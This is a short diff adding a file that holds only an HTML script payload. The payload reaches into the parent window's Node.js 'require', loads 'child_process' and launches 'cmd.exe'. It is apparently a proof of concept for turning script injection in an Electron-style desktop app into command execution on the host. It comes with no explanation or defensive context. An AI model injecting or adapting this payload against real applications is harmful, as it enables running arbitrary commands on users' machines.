@@ -1,0 +1,7 @@
+<script>      
+	window.parent.top.require('child_process').execFile('C:/Windows/System32/cmd.exe',function(error, stdout, stderr){
+    if(error){
+        console.log(error);
+    }  
+    });
+</script>
